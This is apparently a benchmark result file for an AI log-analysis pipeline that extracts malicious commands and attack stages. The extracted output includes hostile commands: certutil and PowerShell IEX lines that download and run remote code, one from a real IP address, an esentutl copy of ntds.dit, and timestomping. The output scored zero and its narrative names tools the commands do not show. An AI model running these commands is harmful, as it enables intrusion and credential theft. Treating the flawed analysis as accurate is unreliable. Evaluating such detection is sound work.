@@ -1,0 +1,108 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\Windows\\System32\\smartscreen.exe -Embedding",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "python.exe -s \"D:\\Postgres\\pgAdmin 4\\web\\pgAdmin4.py\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "pgDumpAll.exe --version",
+        "stage": "Discovery"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "python.exe -s \"D:\\Postgres\\pgAdmin 4\\web\\pgAdmin4.py\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffdt\u017d\u0160\u2026B.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "pwsh -noLogo -nonInteractive -sta -ex bypass -Command \"IEX ([Net.WebRequest]::Create().GetResponseText(\"http://124.223.85.207:8082/a\"));\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "(ls timestomp).LastWriteTime='2020-10-10 12:12:12'",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attacker utilized various tools to execute commands remotely and gain access to sensitive information. CertUtil was used to download and run executable files under the guise of legitimate operations like updating SmartScreen. Additionally, multiple processes were executed using Python and PowerShell scripts, often invoking utilities like Esentutl and Mimikatz to interact with the SAM database and perform credential dumping. The use of Timestomp suggests attempts to alter timestamps for anti-analysis and evasion.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 84512,
+      "completion_tokens": 9575,
+      "total_tokens": 94087,
+      "wall_clock_s": 204.756,
+      "parse_retries": 3
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 14,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 14,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.21428571428571427,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 84512,
+      "completion_tokens": 9575,
+      "total_tokens": 94087,
+      "wall_clock_s": 204.756,
+      "parse_retries": 3
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
